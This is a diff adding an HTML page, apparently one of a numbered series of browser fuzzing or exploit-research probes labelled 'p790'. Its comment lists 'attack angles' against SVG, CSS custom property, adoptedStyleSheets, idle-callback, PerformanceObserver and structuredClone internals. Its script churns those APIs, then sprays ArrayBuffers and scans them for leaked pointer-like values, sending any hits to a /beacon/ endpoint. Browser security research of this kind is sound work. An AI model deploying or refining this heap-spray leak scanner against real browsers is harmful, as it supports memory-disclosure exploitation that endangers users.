@@ -1,0 +1,452 @@
+<!--
+  p790: SVG DOM / CSS custom properties / adoptedStyleSheets / requestIdleCallback / PerformanceObserver residue
+
+  SVG DOM: SVG elements (svg, rect, circle, path, g, use, defs,
+  clipPath, filter, linearGradient) each create C++ SVGElement
+  subclasses with animated attribute backing stores. SVGAnimatedLength,
+  SVGAnimatedTransformList, SVGPathSegList maintain C++ value objects
+  separate from the DOM attribute string. Creating complex SVG trees
+  with gradients, filters, and clipping exercises the SVG allocator
+  pool, which is distinct from the HTML element pool.
+
+  CSS custom properties: element.style.setProperty('--var', value)
+  stores in CSSCustomPropertyValue objects. getComputedStyle reads
+  through the style cascade with custom property resolution. Rapid
+  set/remove of many custom properties exercises the property map.
+
+  adoptedStyleSheets: document.adoptedStyleSheets replaces the
+  adopted stylesheet array with C++ CSSStyleSheet objects created
+  via new CSSStyleSheet(). Each sheet maintains its own rule list.
+
+  requestIdleCallback: registers C++ IdleCallbackDeadline entries.
+  cancelIdleCallback removes them. Bulk register/cancel exercises
+  the idle task queue allocator.
+
+  PerformanceObserver: creates C++ PerformanceObserver with entry
+  buffer. observe() with entryTypes registers for specific entry
+  types. disconnect() clears internal state. Each PerformanceEntry
+  is a C++ object with name/entryType/startTime/duration.
+
+  structuredClone: exercises the structured serialization algorithm
+  with various object graphs, creating C++ SerializedScriptValue
+  intermediaries that include type tags and value encodings.
+
+  Attack angles:
+  A) SVG complex tree create/destroy with filters/gradients.
+  B) CSS custom property set/get/remove rapid churn.
+  C) adoptedStyleSheets create/replace/clear churn.
+  D) requestIdleCallback bulk register/cancel.
+  E) PerformanceObserver observe/disconnect/entry churn.
+  F) structuredClone complex object graph serialization.
+
+  CRASH_CLASS: LOW (SVG/CSS/perf APIs, no side effects)
+  prior art: p775 (SVG pipeline), p784 (CSSStyleSheet)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p790</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p790-START');
+
+// === Section A: SVG complex tree with filters/gradients ===
+try{
+  b('A-svg');
+  var aHits=0;
+  var svgNS='http://www.w3.org/2000/svg';
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var svg=document.createElementNS(svgNS,'svg');
+      svg.setAttribute('width','200');
+      svg.setAttribute('height','200');
+      svg.setAttribute('viewBox','0 0 200 200');
+      document.body.appendChild(svg);
+
+      // Defs with gradients and filters
+      var defs=document.createElementNS(svgNS,'defs');
+      svg.appendChild(defs);
+
+      for(var i=0;i<10;i++){
+        // Linear gradient
+        var lg=document.createElementNS(svgNS,'linearGradient');
+        lg.setAttribute('id','lg_'+round+'_'+i);
+        lg.setAttribute('x1','0%');lg.setAttribute('y1','0%');
+        lg.setAttribute('x2','100%');lg.setAttribute('y2','100%');
+        var s1=document.createElementNS(svgNS,'stop');
+        s1.setAttribute('offset','0%');s1.setAttribute('stop-color','rgb('+(i*25)+',0,0)');
+        var s2=document.createElementNS(svgNS,'stop');
+        s2.setAttribute('offset','100%');s2.setAttribute('stop-color','rgb(0,0,'+(i*25)+')');
+        lg.appendChild(s1);lg.appendChild(s2);
+        defs.appendChild(lg);
+
+        // Radial gradient
+        var rg=document.createElementNS(svgNS,'radialGradient');
+        rg.setAttribute('id','rg_'+round+'_'+i);
+        rg.setAttribute('cx','50%');rg.setAttribute('cy','50%');rg.setAttribute('r','50%');
+        var rs1=document.createElementNS(svgNS,'stop');
+        rs1.setAttribute('offset','0%');rs1.setAttribute('stop-color','white');
+        var rs2=document.createElementNS(svgNS,'stop');
+        rs2.setAttribute('offset','100%');rs2.setAttribute('stop-color','rgb(0,'+(i*25)+',0)');
+        rg.appendChild(rs1);rg.appendChild(rs2);
+        defs.appendChild(rg);
+
+        // Filter
+        var filter=document.createElementNS(svgNS,'filter');
+        filter.setAttribute('id','f_'+round+'_'+i);
+        var blur=document.createElementNS(svgNS,'feGaussianBlur');
+        blur.setAttribute('stdDeviation',String(1+i*0.5));
+        filter.appendChild(blur);
+        var offset=document.createElementNS(svgNS,'feOffset');
+        offset.setAttribute('dx',String(i));offset.setAttribute('dy',String(i));
+        filter.appendChild(offset);
+        defs.appendChild(filter);
+
+        // ClipPath
+        var clip=document.createElementNS(svgNS,'clipPath');
+        clip.setAttribute('id','cp_'+round+'_'+i);
+        var cr=document.createElementNS(svgNS,'circle');
+        cr.setAttribute('cx','50');cr.setAttribute('cy','50');cr.setAttribute('r',String(20+i*3));
+        clip.appendChild(cr);
+        defs.appendChild(clip);
+      }
+
+      // Shape elements using gradients/filters
+      for(var i=0;i<20;i++){
+        var rect=document.createElementNS(svgNS,'rect');
+        rect.setAttribute('x',String(i*8));rect.setAttribute('y',String(i*8));
+        rect.setAttribute('width','30');rect.setAttribute('height','20');
+        rect.setAttribute('fill','url(#lg_'+round+'_'+(i%10)+')');
+        rect.setAttribute('filter','url(#f_'+round+'_'+(i%10)+')');
+        svg.appendChild(rect);
+
+        var circle=document.createElementNS(svgNS,'circle');
+        circle.setAttribute('cx',String(100+i*3));circle.setAttribute('cy',String(50+i*5));
+        circle.setAttribute('r','10');
+        circle.setAttribute('fill','url(#rg_'+round+'_'+(i%10)+')');
+        circle.setAttribute('clip-path','url(#cp_'+round+'_'+(i%10)+')');
+        svg.appendChild(circle);
+
+        // Path with d attribute (creates SVGPathSegList)
+        var path=document.createElementNS(svgNS,'path');
+        path.setAttribute('d','M '+(i*5)+' '+(i*3)+' L '+(i*5+20)+' '+(i*3+15)+' Q '+(i*5+10)+' '+(i*3+25)+' '+(i*5)+' '+(i*3));
+        path.setAttribute('stroke','black');path.setAttribute('fill','none');
+        svg.appendChild(path);
+      }
+
+      if(round===0)b('A SVG tree: '+svg.childNodes.length+' top children, 10 gradients + 10 filters + 10 clipPaths');
+
+      document.body.removeChild(svg);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: CSS custom property set/get/remove churn ===
+try{
+  b('B-css-vars');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+      for(var i=0;i<30;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:50px;height:50px;display:inline-block;';
+        document.body.appendChild(el);
+
+        // Set many custom properties
+        for(var j=0;j<40;j++){
+          el.style.setProperty('--var-'+round+'-'+i+'-'+j,
+            'value_'+'v'.repeat(10+j%20)+'_'+round);
+        }
+
+        // Read them via getComputedStyle
+        var cs=getComputedStyle(el);
+        for(var j=0;j<40;j++){
+          try{cs.getPropertyValue('--var-'+round+'-'+i+'-'+j);}catch(e){}
+        }
+
+        // Remove them
+        for(var j=0;j<40;j++){
+          el.style.removeProperty('--var-'+round+'-'+i+'-'+j);
+        }
+
+        elements.push(el);
+      }
+
+      if(round===0)b('B churned 30 elements x 40 custom properties each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: adoptedStyleSheets create/replace/clear ===
+try{
+  b('C-adopted');
+  var cHits=0;
+
+  var asSupported=false;
+  try{
+    if(typeof CSSStyleSheet==='function'){
+      var test=new CSSStyleSheet();
+      asSupported=true;
+    }
+  }catch(e){}
+
+  if(!asSupported){
+    b('C-SKIP no CSSStyleSheet constructor');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var sheets=[];
+
+        for(var i=0;i<30;i++){
+          try{
+            var sheet=new CSSStyleSheet();
+            sheet.replaceSync('.rule_'+round+'_'+i+' { color: rgb('+(i*8)+','+(round*40)+',100); font-size: '+(10+i)+'px; }');
+            for(var j=0;j<5;j++){
+              sheet.insertRule('.extra_'+round+'_'+i+'_'+j+' { margin: '+j+'px; padding: '+(j*2)+'px; }');
+            }
+            sheets.push(sheet);
+          }catch(e){
+            if(i===0&&round===0)b('C sheet_err='+e.message);
+          }
+        }
+
+        if(round===0)b('C created '+sheets.length+' CSSStyleSheet objects');
+
+        // Adopt them
+        try{
+          document.adoptedStyleSheets=sheets;
+        }catch(e){
+          if(round===0)b('C adopt_err='+e.message);
+        }
+
+        // Clear
+        try{
+          document.adoptedStyleSheets=[];
+        }catch(e){}
+
+        sheets=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[48,64,96,128]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: requestIdleCallback bulk register/cancel ===
+try{
+  b('D-idle');
+  var dHits=0;
+
+  var ricSupported=typeof requestIdleCallback!=='undefined';
+  if(!ricSupported){
+    b('D-SKIP no requestIdleCallback');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var ids=[];
+        for(var i=0;i<500;i++){
+          var id=requestIdleCallback(function(deadline){},{timeout:100+i});
+          ids.push(id);
+        }
+
+        if(round===0){
+          b('D registered '+ids.length+' idle callbacks');
+          b('D id_range='+ids[0]+'-'+ids[ids.length-1]);
+        }
+
+        for(var i=0;i<ids.length;i++){
+          cancelIdleCallback(ids[i]);
+        }
+        ids=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[32,48,64,96]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: PerformanceObserver observe/disconnect/entry ===
+try{
+  b('E-perfobs');
+  var eHits=0;
+
+  var poSupported=typeof PerformanceObserver!=='undefined';
+  if(!poSupported){
+    b('E-SKIP no PerformanceObserver');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var observers=[];
+        var entryCount=0;
+
+        // Create observers for different entry types
+        var types=['mark','measure'];
+
+        for(var t=0;t<types.length;t++){
+          for(var i=0;i<10;i++){
+            try{
+              var obs=new PerformanceObserver(function(list){
+                entryCount+=list.getEntries().length;
+              });
+              obs.observe({entryTypes:[types[t]]});
+              observers.push(obs);
+            }catch(e){
+              if(i===0&&t===0&&round===0)b('E obs_err='+e.message);
+            }
+          }
+        }
+
+        if(round===0)b('E created '+observers.length+' PerformanceObservers');
+
+        // Generate performance entries
+        for(var i=0;i<50;i++){
+          try{
+            performance.mark('mark_'+round+'_'+i);
+          }catch(e){}
+        }
+        for(var i=0;i<25;i++){
+          try{
+            performance.measure('measure_'+round+'_'+i,
+              'mark_'+round+'_'+(i*2),'mark_'+round+'_'+(i*2+1));
+          }catch(e){}
+        }
+
+        if(round===0)b('E generated 50 marks + 25 measures, entries='+entryCount);
+
+        // Disconnect all
+        for(var i=0;i<observers.length;i++){
+          observers[i].disconnect();
+        }
+
+        // Clear marks/measures
+        try{performance.clearMarks();}catch(e){}
+        try{performance.clearMeasures();}catch(e){}
+
+        observers=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      eHits+=sprayAndScan('E',round,[32,48,64,96,128]);
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: structuredClone complex object serialization ===
+try{
+  b('F-structuredclone');
+  var fHits=0;
+
+  var scSupported=typeof structuredClone!=='undefined';
+  if(!scSupported){
+    b('F-SKIP no structuredClone');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var clones=[];
+
+        for(var i=0;i<50;i++){
+          try{
+            // Complex nested objects
+            var obj={
+              str:'string_'+round+'_'+i+'_'+'s'.repeat(30),
+              num:Math.PI*i,
+              bool:i%2===0,
+              arr:[1,2,3,'four',{nested:true},[5,6,[7,8]]],
+              date:new Date(2020+round,i%12,1+i%28),
+              regex:new RegExp('pattern_'+i,'gi'),
+              map:new Map([['key1','val1'],['key2',i],['key3',{deep:round}]]),
+              set:new Set([1,'two',3,{four:4},round]),
+              ab:new ArrayBuffer(32),
+              typed:new Float64Array([1.1,2.2,3.3,i*0.1]),
+              nested:{
+                level2:{
+                  level3:{
+                    data:'deep_'+round+'_'+i
+                  }
+                }
+              }
+            };
+
+            var clone=structuredClone(obj);
+            clones.push(clone);
+          }catch(e){
+            if(i===0&&round===0)b('F clone_err='+e.message);
+          }
+        }
+
+        if(round===0)b('F cloned '+clones.length+' complex objects');
+
+        // Also clone with transfer
+        for(var i=0;i<20;i++){
+          try{
+            var ab=new ArrayBuffer(96);
+            var dv=new DataView(ab);
+            dv.setFloat64(0,Math.PI*round);
+            dv.setUint32(8,i);
+            var clone=structuredClone(ab,[ab]);
+            clones.push(clone);
+          }catch(e){}
+        }
+
+        clones=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p790-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
